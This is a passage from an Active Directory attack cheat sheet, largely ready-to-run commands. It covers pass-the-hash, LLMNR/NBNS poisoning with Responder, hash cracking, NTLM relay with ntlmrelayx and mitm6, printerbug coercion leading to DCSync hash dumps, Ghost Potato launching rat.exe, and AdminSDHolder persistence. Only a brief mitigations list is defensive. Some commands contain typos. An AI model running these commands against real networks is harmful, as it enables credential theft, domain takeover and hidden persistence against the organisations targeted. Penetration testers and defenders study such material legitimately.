</span><span class="n">ktutil</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">~/mykeys</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">tgwynn</span><span class="err">@</span><span class="nx">LAB.ROPNOP.COM</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">arcfour-hma-md5</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">1a59bd44fe5bec39c44c8cd3524dee</span><span class="w"> </span><span class="nt">--hex</span><span class="w"> </span><span class="nt">-V</span><span class="w"> </span><span class="nx">5</span><span class="w">
</span><span class="n">kinit</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">~/mykers</span><span class="w"> </span><span class="nx">tgwynn</span><span class="err">@</span><span class="nx">LAB.ROPNOP.COM</span><span class="w">
</span><span class="n">klist</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="using-rubeus">Using Rubeus</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">C:\Users\triceratops</span><span class="err">&gt;</span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:jurassic.park</span><span class="w"> </span><span class="nx">/user:velociraptor</span><span class="w"> </span><span class="nx">/rc4:2a3de7fe356ee524cc9f3d579f2e0aa7</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">C:\Users\triceratops</span><span class="err">&gt;</span><span class="o">.</span><span class="nx">\PsExec.exe</span><span class="w"> </span><span class="nt">-accepteula</span><span class="w"> </span><span class="nx">\\labwws02.jurassic.park</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="capturing-and-cracking-ntlmv2-hashes">Capturing and cracking NTLMv2 hashes</h3>

<p>If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison <code class="language-plaintext highlighter-rouge">LLMNR</code>, <code class="language-plaintext highlighter-rouge">MDNS</code> and <code class="language-plaintext highlighter-rouge">NETBIOS</code> requests on the network.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c"># https://github.com/lgandx/Responder</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">.</span><span class="nx">/Responder.py</span><span class="w"> </span><span class="nt">-I</span><span class="w"> </span><span class="nx">eth0</span><span class="w"> </span><span class="nt">-wfrd</span><span class="w"> </span><span class="nt">-P</span><span class="w"> </span><span class="nt">-v</span><span class="w">

</span><span class="c"># https://github.com/Kevin-Robertson/InveighZero</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\inveighzero.exe</span><span class="w"> </span><span class="nt">-FileOutput</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-NBNS</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-mDNS</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-Proxy</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-MachineAccounts</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-DHCPv6</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-LLMNRv6</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="p">[</span><span class="nt">-Elevated</span><span class="w"> </span><span class="n">N</span><span class="p">]</span><span class="w">

</span><span class="c"># https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">Invoke</span><span class="nt">-Inveigh</span><span class="w"> </span><span class="p">[</span><span class="nt">-IP</span><span class="w"> </span><span class="s1">'10.10.10.10'</span><span class="p">]</span><span class="w"> </span><span class="nt">-ConsoleOutput</span><span class="w"> </span><span class="n">Y</span><span class="w"> </span><span class="nt">-FileOutput</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-NBNS</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="err">–</span><span class="nx">mDNS</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="err">–</span><span class="nx">Proxy</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-MachineAccounts</span><span class="w"> </span><span class="nx">Y</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="man-in-the-middle-attacks--relaying">Man-in-the-Middle attacks &amp; relaying</h3>

<p>NTLMv1 and NTLMv2 can be relayed to connect to another machine.</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Hash</th>
      <th>Hashcat</th>
      <th>Attack method</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>LM</td>
      <td>3000</td>
      <td>crack/pass the hash</td>
    </tr>
    <tr>
      <td>NTLM/NTHash</td>
      <td>1000</td>
      <td>crack/pass the hash</td>
    </tr>
    <tr>
      <td>NTLMv1/Net-NTLMv1</td>
      <td>5500</td>
      <td>crack/relay attack</td>
    </tr>
    <tr>
      <td>NTLMv2/Net-NTLMv2</td>
      <td>5600</td>
      <td>crack/relay attack</td>
    </tr>
  </tbody>
</table></div>

<p>Crack the hash with <code class="language-plaintext highlighter-rouge">hashcat</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">hashcat</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">5600</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">hash.txt</span><span class="w"> </span><span class="nx">crackstation.txt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="ms08-068-ntlm-reflection">MS08-068 NTLM reflection</h4>

<p>NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.</p>

<blockquote>
  <p>This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim’s own credentials.</p>
</blockquote>

<ul>
  <li>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">msf</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">exploit/windows/smb/smb_relay</span><span class="w">
</span><span class="n">msf</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="n">smb_relay</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="nx">targets</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="smb-signing-disabled-and-ipv4">SMB Signing Disabled and IPv4</h4>

<p>If a machine has <code class="language-plaintext highlighter-rouge">SMB signing</code>:<code class="language-plaintext highlighter-rouge">disabled</code>, it is possible to use Responder with Multirelay.py script to perform an <code class="language-plaintext highlighter-rouge">NTLMv2 hashes relay</code> and get a shell access on the machine. Also called <strong>LLMNR/NBNS Poisoning</strong></p>

<ol>
  <li>Open the Responder.conf file and set the value of <code class="language-plaintext highlighter-rouge">SMB</code> and <code class="language-plaintext highlighter-rouge">HTTP</code> to <code class="language-plaintext highlighter-rouge">Off</code>.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="p">[</span><span class="n">Responder</span><span class="w"> </span><span class="n">Core</span><span class="p">]</span><span class="w">
 </span><span class="p">;</span><span class="w"> </span><span class="n">Servers</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">start</span><span class="w">
 </span><span class="o">...</span><span class="w">
 </span><span class="n">SMB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Off</span><span class="w">     </span><span class="c"># Turn this off</span><span class="w">
 </span><span class="n">HTTP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Off</span><span class="w">    </span><span class="c"># Turn this off</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Run <code class="language-plaintext highlighter-rouge">python  RunFinger.py -i IP_Range</code> to detect machine with <code class="language-plaintext highlighter-rouge">SMB signing</code>:<code class="language-plaintext highlighter-rouge">disabled</code>.</li>
  <li>Run <code class="language-plaintext highlighter-rouge">python Responder.py -I &lt;interface_card&gt;</code></li>
  <li>Use a relay tool such as <code class="language-plaintext highlighter-rouge">ntlmrelayx</code> or <code class="language-plaintext highlighter-rouge">MultiRelay</code>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">impacket-ntlmrelayx -tf targets.txt</code> to dump the SAM database of the targets in the list.</li>
      <li><code class="language-plaintext highlighter-rouge">python MultiRelay.py -t &lt;target_machine_IP&gt; -u ALL</code></li>
    </ul>
  </li>
  <li>ntlmrelayx can also act as a SOCK proxy with every compromised sessions.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">impacket-ntlmrelayx</span><span class="w"> </span><span class="nt">-tf</span><span class="w"> </span><span class="nx">/tmp/targets.txt</span><span class="w"> </span><span class="nt">-socks</span><span class="w"> </span><span class="nt">-smb2support</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Servers</span><span class="w"> </span><span class="nx">started</span><span class="p">,</span><span class="w"> </span><span class="nx">waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">connections</span><span class="w">
 </span><span class="kr">Type</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">commands</span><span class="w">
 </span><span class="n">ntlmrelayx</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">socks</span><span class="w">
 </span><span class="n">Protocol</span><span class="w">  </span><span class="nx">Target</span><span class="w">          </span><span class="nx">Username</span><span class="w">                  </span><span class="nx">Port</span><span class="w">
 </span><span class="o">--------</span><span class="w">  </span><span class="o">--------------</span><span class="w">  </span><span class="o">------------------------</span><span class="w">  </span><span class="o">----</span><span class="w">
 </span><span class="n">MSSQL</span><span class="w">     </span><span class="nx">192.168.48.230</span><span class="w">  </span><span class="nx">VULNERABLE/ADMINISTRATOR</span><span class="w">  </span><span class="nx">1433</span><span class="w">
 </span><span class="n">SMB</span><span class="w">       </span><span class="nx">192.168.48.230</span><span class="w">  </span><span class="nx">CONTOSO/NORMALUSER1</span><span class="w">       </span><span class="nx">445</span><span class="w">
 </span><span class="n">MSSQL</span><span class="w">     </span><span class="nx">192.168.48.230</span><span class="w">  </span><span class="nx">CONTOSO/NORMALUSER1</span><span class="w">       </span><span class="nx">1433</span><span class="w">

 </span><span class="c"># You might need to select a target with "-t"</span><span class="w">
 </span><span class="n">impacket-ntlmrelayx</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">mssql://10.10.10.10</span><span class="w"> </span><span class="nt">-socks</span><span class="w"> </span><span class="nt">-smb2support</span><span class="w">
 </span><span class="n">impacket-ntlmrelayx</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">smb://10.10.10.10</span><span class="w"> </span><span class="nt">-socks</span><span class="w"> </span><span class="nt">-smb2support</span><span class="w">

 </span><span class="c"># the socks proxy can then be used with your Impacket tools or CrackMapExec</span><span class="w">
 </span><span class="err">$</span><span class="w"> </span><span class="n">proxychains</span><span class="w"> </span><span class="nx">impacket-smbclient</span><span class="w"> </span><span class="nx">//192.168.48.230/Users</span><span class="w"> </span><span class="nt">-U</span><span class="w"> </span><span class="nx">contoso/normaluser1</span><span class="w">
 </span><span class="err">$</span><span class="w"> </span><span class="n">proxychains</span><span class="w"> </span><span class="nx">impacket-mssqlclient</span><span class="w"> </span><span class="nx">DOMAIN/USER</span><span class="err">@</span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-windows-auth</span><span class="w">
 </span><span class="err">$</span><span class="w"> </span><span class="n">proxychains</span><span class="w"> </span><span class="nx">crackmapexec</span><span class="w"> </span><span class="nx">mssql</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s1">''</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">DOMAIN</span><span class="w"> </span><span class="nt">-q</span><span class="w"> </span><span class="s2">"SELECT 1"</span><span class="w">   
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ol>

<p><strong>Mitigations</strong>:</p>

<ul>
  <li>Disable LLMNR via group policy
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">Open</span><span class="w"> </span><span class="nx">gpedit.msc</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">navigate</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">Computer</span><span class="w"> </span><span class="nx">Configuration</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Administrative</span><span class="w"> </span><span class="nx">Templates</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Network</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">DNS</span><span class="w"> </span><span class="nx">Client</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Turn</span><span class="w"> </span><span class="nx">off</span><span class="w"> </span><span class="nx">multicast</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">resolution</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Disable NBT-NS
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">achieved</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">navigating</span><span class="w"> </span><span class="nx">through</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">GUI</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">Network</span><span class="w"> </span><span class="nx">card</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Properties</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">IPv4</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Advanced</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">WINS</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">then</span><span class="w"> </span><span class="nx">under</span><span class="w"> </span><span class="s2">"NetBIOS setting"</span><span class="w"> </span><span class="nx">select</span><span class="w"> </span><span class="nx">Disable</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">TCP/IP</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h4 id="smb-signing-disabled-and-ipv6">SMB Signing Disabled and IPv6</h4>

<p>Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="n">crackmapexec</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nv">$hosts</span><span class="w"> </span><span class="nt">--gen-relay-list</span><span class="w"> </span><span class="nx">relay.txt</span><span class="w">

</span><span class="c"># DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6</span><span class="w">
</span><span class="c"># -d is the domain name that we filter our request on - the attacked domain</span><span class="w">
</span><span class="c"># -i is the interface we have mitm6 listen on for events</span><span class="w">
</span><span class="n">mitm6</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">eth0</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nv">$domain</span><span class="w">

</span><span class="c"># spoofing WPAD and relaying NTLM credentials</span><span class="w">
</span><span class="n">impacket-ntlmrelayx</span><span class="w"> </span><span class="nt">-6</span><span class="w"> </span><span class="nt">-wh</span><span class="w"> </span><span class="nv">$attacker_ip</span><span class="w"> </span><span class="nt">-of</span><span class="w"> </span><span class="nx">loot</span><span class="w"> </span><span class="nt">-tf</span><span class="w"> </span><span class="nx">relay.txt</span><span class="w">
</span><span class="n">impacket-ntlmrelayx</span><span class="w"> </span><span class="nt">-6</span><span class="w"> </span><span class="nt">-wh</span><span class="w"> </span><span class="nv">$attacker_ip</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">/tmp</span><span class="w"> </span><span class="nt">-socks</span><span class="w"> </span><span class="nt">-debug</span><span class="w">

</span><span class="c"># -ip is the interface you want the relay to run on</span><span class="w">
</span><span class="c"># -wh is for WPAD host, specifying your wpad file to serve</span><span class="w">
</span><span class="c"># -t is the target where you want to relay to. </span><span class="w">
</span><span class="n">impacket-ntlmrelayx</span><span class="w"> </span><span class="nt">-ip</span><span class="w"> </span><span class="nx">10.10.10.1</span><span class="w"> </span><span class="nt">-wh</span><span class="w"> </span><span class="nv">$attacker_ip</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">ldaps://10.10.10.2</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="drop-the-mic">Drop the MIC</h4>

<blockquote>
  <p>The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP</p>
</blockquote>

<p>Check vulnerability with <a href="https://github.com/fox-it/cve-2019-1040-scanner">cve-2019-1040-scanner</a></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">python2</span><span class="w"> </span><span class="nx">scanMIC.py</span><span class="w"> </span><span class="s1">'DOMAIN/USERNAME:PASSWORD@TARGET'</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">CVE-2019-1040</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="err">@</span><span class="nx">_dirkjan</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">Fox-IT</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Based</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">impacket</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">SecureAuth</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Target</span><span class="w"> </span><span class="nx">TARGET</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">vulnerable</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">CVE-2019-1040</span><span class="w"> </span><span class="p">(</span><span class="n">authentication</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">rejected</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">TERM1</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="nx">printerbug.py</span><span class="w"> </span><span class="nx">testsegment.local/testuser</span><span class="err">@</span><span class="nx">s2012exc.testsegment.local</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">attacker</span><span class="w"> </span><span class="nx">ip/hostname</span><span class="err">&gt;</span><span class="w">
  </span><span class="n">TERM2</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ntlmrelayx.py</span><span class="w"> </span><span class="nt">--remove-mic</span><span class="w"> </span><span class="nt">--escalate-user</span><span class="w"> </span><span class="nx">ntu</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">ldap://s2016dc.testsegment.local</span><span class="w"> </span><span class="nt">-smb2support</span><span class="w">
  </span><span class="n">TERM1</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">secretsdump.py</span><span class="w"> </span><span class="nx">testsegment/ntu</span><span class="err">@</span><span class="nx">s2016dc.testsegment.local</span><span class="w"> </span><span class="nt">-just-dc</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="c"># create a new machine account</span><span class="w">
  </span><span class="n">TERM1</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ntlmrelayx.py</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">ldaps://rlt-dc.relaytest.local</span><span class="w"> </span><span class="nt">--remove-mic</span><span class="w"> </span><span class="nt">--delegate-access</span><span class="w"> </span><span class="nt">-smb2support</span><span class="w"> 
  </span><span class="n">TERM2</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="nx">printerbug.py</span><span class="w"> </span><span class="nx">relaytest.local/testuser</span><span class="err">@</span><span class="nx">second-dc-server</span><span class="w"> </span><span class="nx">10.0.2.6</span><span class="w">
  </span><span class="n">TERM1</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">getST.py</span><span class="w"> </span><span class="nt">-spn</span><span class="w"> </span><span class="nx">host/second-dc-server.local</span><span class="w"> </span><span class="s1">'relaytest.local/MACHINE$:PASSWORD'</span><span class="w"> </span><span class="nt">-impersonate</span><span class="w"> </span><span class="nx">DOMAIN_ADMIN_USER_NAME</span><span class="w">

  </span><span class="c"># connect using the ticket</span><span class="w">
  </span><span class="n">export</span><span class="w"> </span><span class="nx">KRB5CCNAME</span><span class="o">=</span><span class="n">DOMAIN_ADMIN_USER_NAME.ccache</span><span class="w">
  </span><span class="nx">secretsdump.py</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">-no-pass</span><span class="w"> </span><span class="nx">second-dc-server.local</span><span class="w"> </span><span class="nt">-just-dc</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h4 id="ghost-potato---cve-2019-1384">Ghost Potato - CVE-2019-1384</h4>

<p>Prerequisites:</p>
<ul>
  <li>User must be a member of the local Administrators group</li>
  <li>User must be a member of the Backup Operators group</li>
  <li>Token must be elevated</li>
</ul>

<p>Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">ntlmrelayx</span><span class="w"> </span><span class="nt">-smb2support</span><span class="w"> </span><span class="nt">--no-smb-server</span><span class="w"> </span><span class="nt">--gpotato-startup</span><span class="w"> </span><span class="nx">rat.exe</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="dangerous-built-in-groups-usage">Dangerous Built-in Groups Usage</h3>

<p>If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object <code class="language-plaintext highlighter-rouge">CN=AdminSDHolder,CN=System</code> or set <code class="language-plaintext highlighter-rouge">"dminCount</code> attribute to <code class="language-plaintext highlighter-rouge">0</code> for the required object.</p>

<blockquote>
  <p>The AdminCount attribute is set to <code class="language-plaintext highlighter-rouge">1</code> automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).</p>
</blockquote>

<p>Find users with <code class="language-plaintext highlighter-rouge">AdminCount=1</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">crackmapexec</span><span class="w"> </span><span class="nx">ldap</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nt">--admin-count</span><span class="w">
</span><span class="c"># or</span><span class="w">
</span><span class="n">python</span><span class="w"> </span><span class="nx">ldapdomaindump.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">example.com\john</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">pass123</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s1">';'</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w">
</span><span class="n">jq</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="s1">'.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]'</span><span class="w"> </span><span class="nx">domain_users.json</span><span class="w">
</span><span class="c"># or</span><span class="w">
</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-LDAPFilter</span><span class="w"> </span><span class="s2">"(objectcategory=person)(samaccountname=*)(admincount=1)"</span><span class="w">
</span><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-LDAPFilter</span><span class="w"> </span><span class="s2">"(objectcategory=group) (admincount=1)"</span><span class="w">
</span><span class="c"># or</span><span class="w">
</span><span class="p">([</span><span class="n">adsisearcher</span><span class="p">]</span><span class="s2">"(AdminCount=1)"</span><span class="p">)</span><span class="o">.</span><span class="nf">findall</span><span class="p">()</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="adminsdholder-abuse">AdminSDHolder Abuse</h4>

<blockquote>
  <p>The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all “protected groups” in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.</p>
</blockquote>

<p>If you modify the permissions of <strong>AdminSDHolder</strong>, that permission template will be pushed out to all protected accounts automatically by <code class="language-plaintext highlighter-rouge">SDProp</code> (in an hour).
E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c"># Add a user to the AdminSDHolder group:</span><span class="w">
</span><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s1">'CN=AdminSDHolder,CN=System,DC=domain,DC=local'</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">

</span><span class="c"># Right to reset password for toto using the account titi</span><span class="w">
</span><span class="n">Add-ObjectACL</span><span class="w"> </span><span class="nt">-TargetSamAccountName</span><span class="w"> </span><span class="nx">toto</span><span class="w"> </span><span class="nt">-PrincipalSamAccountName</span><span class="w"> </span><span class="nx">titi</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">ResetPassword</span><span class="w">

</span><span class="c"># Give all rights</span><span class="w">
